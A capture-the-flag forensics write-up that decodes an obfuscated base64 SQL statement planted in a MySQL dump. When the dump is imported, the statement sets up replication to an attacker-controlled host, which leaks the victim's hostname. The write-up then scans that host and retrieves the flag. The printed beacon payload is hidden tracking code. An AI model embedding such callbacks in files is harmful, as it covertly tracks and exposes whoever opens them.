# buzzbuzz

Last week, we detected some suspicious activity on the network from outside actors seemingly targeting our servers. We received a ransom email over the weekend, but IT didn't open it up until Tuesday afternoon and verified the stolen data as authentic. We thought the attackers were bluffing since we ignored the email for days, but lo and behold, our systems were indeed encrypted Wednesday afternoon!

How did the attackers know when we opened up the email?

# Solution
After extract, we can see PDF and dump. During the analysis we can find:
```sql
SET @b = 'U0VUIEBiYiA9IENPTkNBVCgiQ0hBTkdFIE1BU1RFUiBUTyBNQVNURVJfUEFTU1dPUkQ9J2J1c3liZWUxMjMnLCBNQVNURVJfUkVUUllfQ09VTlQ9MSwgTUFTVEVSX1BPUlQ9MzMwNiwgTUFTVEVSX0hPU1Q9J2QyNWQtNDRmZi1iM2FhLTFiZDU3MzMzNWNiZi5hZXlpZTRsZWkxYWlkaWU3LmluLXNjb3BlLmlyaXNjLnRmJywgTUFTVEVSX1VTRVI9J2RidXNlciIsIEBAbGNfdGltZV9uYW1lcywgQEBob3N0bmFtZSwgIic7Iik7';
SET @s2 = FROM_BASE64(@b);
```
then we can check it
```bash
❯ echo "U0VUIEBiYiA9IENPTkNBVCgiQ0hBTkdFIE1BU1RFUiBUTyBNQVNURVJfUEFTU1dPUkQ9J2J1c3liZWUxMjMnLCBNQVNURVJfUkVUUllfQ09VTlQ9MSwgTUFTVEVSX1BPUlQ9MzMwNiwgTUFTVEVSX0hPU1Q9J2QyNWQtNDRmZi1iM2FhLTFiZDU3MzMzNWNiZi5hZXlpZTRsZWkxYWlkaWU3LmluLXNjb3BlLmlyaXNjLnRmJywgTUFTVEVSX1VTRVI9J2RidXNlciIsIEBAbGNfdGltZV9uYW1lcywgQEBob3N0bmFtZSwgIic7Iik7" |base64 -d
SET @bb = CONCAT("CHANGE MASTER TO MASTER_PASSWORD='busybee123', MASTER_RETRY_COUNT=1, MASTER_PORT=3306, MASTER_HOST='d25d-44ff-b3aa-1bd573335cbf.aeyie4lei1aidie7.in-scope.irisc.tf', MASTER_USER='dbuser", @@lc_time_names, @@hostname, "';");
```

Thx to above code attackers know when dump was used. Then we can check DNS and open ports.
```bash
❯ host aeyie4lei1aidie7.in-scope.irisc.tf
aeyie4lei1aidie7.in-scope.irisc.tf has address 35.228.27.236
❯ nmap -P0 35.228.27.236
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-07 21:14 CET
Nmap scan report for 236.27.228.35.bc.googleusercontent.com (35.228.27.236)
Host is up (0.0026s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 66.21 seconds
```

Now we can open 8080 and we can see the page:
```html
<!DOCTYPE html>
<html>

<head>
	<title>Billy Bad&#39;s HoneyToken Tool</title>
	<link rel="stylesheet" type="text/css" href="/static/css/style.css">
	<link rel="shortcut icon" type="image/png" href="/static/png/favicon.png">
</head>

<body>

	<h1>Billy Bad's HoneyToken Tool</h1>
	<button onclick="make()">Create a HoneyToken.</button>

	<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
	<script>
		function make() {
			alert("This feature has been temporarily disabled.");
//			$.ajax(
//			{
//				type: "POST",
//				url: "/make",
//				success: function(data)
//				{
//					let trigger = data + ".aeYie4lei1aidie7.in-scope.irisc.tf";
//					let control = "http://aeYie4lei1aidie7.in-scope.irisc.tf/manage/" + data;
//					alert("Done. Requests to " + trigger + " can be tracked at " + control + ".");
//				}
//			})
		}
	</script>

</body>
```
based on the data which we have from the mysql dump we can get the flag:
```bash
❯ curl aeyie4lei1aidie7.in-scope.irisc.tf:8080/manage/d25d-44ff-b3aa-1bd573335cbf
<!DOCTYPE html>
<html>

<head>
        <title>HoneyToken Management</title>
        <link rel="stylesheet" type="text/css" href="/static/css/style.css">
        <link rel="shortcut icon" type="image/png" href="/static/png/favicon.png">
</head>

<body>

        <h1>HoneyToken Management</h1>
        <p><b>irisctf{h0neyt0kens_4rent_0nly_us3d_by_th3_wh1te_hat5}</b></p>
        <table id="hits">
                <tr>
                        <th>Timestamp</th>
                        <th>IP Address</th>
                </tr>

                        <tr>
                                <td>2024-01-07 20:11:42</td>
                                <td>172.**.**.**</td>
                        </tr>
...
```


# Flag
`irisctf{h0neyt0kens_4rent_0nly_us3d_by_th3_wh1te_hat5}`

# Hashtags
#forensics